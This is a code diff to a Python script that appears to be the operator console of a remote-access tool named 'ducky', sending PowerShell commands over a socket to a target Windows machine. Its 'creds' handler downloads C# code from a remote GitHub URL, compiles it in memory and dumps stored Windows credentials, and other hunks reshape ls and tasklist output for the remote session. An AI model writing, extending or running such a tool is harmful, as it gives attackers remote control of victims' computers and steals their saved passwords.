@@ -347,17 +347,13 @@ while not stop:
         elif ducky_command[:5] == "creds":
             commands = []
             commands.append("(add-type -typedefinition (new-object net.webclient).downloadstring(\"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/dump-creds.cs\") -language csharp -passthru)>$null")
-            commands.append("([credential]::loadall() | out-string).trim()")
+            commands.append("([credential]::loadall()|out-string).trim()")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
     elif stdin.startswith("k ") and stdin[2] != "\"":
         stdin = "k \"" + stdin[2:] + "\""
-    elif stdin == "ls" or stdin.startswith("ls "):
-        stdin = "(" + stdin + " | out-string).trim()"
-    elif stdin.startswith("tasklist"):
-        stdin = "(" + stdin + " | out-string).trim()"
     elif stdin == "clear":
         if sys.platform[:5] == "linux" or sys.platform == "darwin":
             os.system("clear")
@@ -365,7 +361,10 @@ while not stop:
             os.system("cls")
         else:
             print("ERROR: Operating system not compatible, unable to clear screen.")
-        stdin = "clear"
+    elif stdin == "ls" or stdin.startswith("ls "):
+        stdin = "(" + stdin + " | out-string).trim()"
+    elif "tasklist" in stdin:
+        stdin = "(" + stdin + " | out-string).trim()"
     last = stdin
     conn.send((stdin + "\n").encode())
 s.close()
